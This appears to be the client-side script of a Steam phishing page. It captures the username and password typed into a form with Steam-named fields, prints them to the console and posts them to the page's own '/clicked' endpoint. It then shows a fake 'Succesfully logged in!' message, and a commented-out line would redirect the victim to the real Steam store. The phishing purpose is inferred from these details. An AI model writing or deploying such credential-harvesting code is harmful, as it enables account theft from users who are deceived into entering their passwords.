console.log('Client-side code running');

const button = document.getElementById('loginForm');
const username = document.getElementById('steamAccountName');
const password = document.getElementById('steamPassword');
button.addEventListener('submit', function(e) {
  console.log(username.value);
  console.log(password.value);

    fetch('/clicked', {
      method: 'POST',    
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
      user: {
            name: username.value,
            pw: password.value
            }
    })
    })
    .then(function(response) {
      if(response.ok) {
        console.log('Click was recorded');
        if(response.status == 200){
          window.alert("Succesfully logged in!");
        }
        return;
      }
      throw new Error(window.alert("Failed login"));
    })
    .catch(function(error) {
      console.log(error);
    });
   // location.replace("https://store.steampowered.com/")
});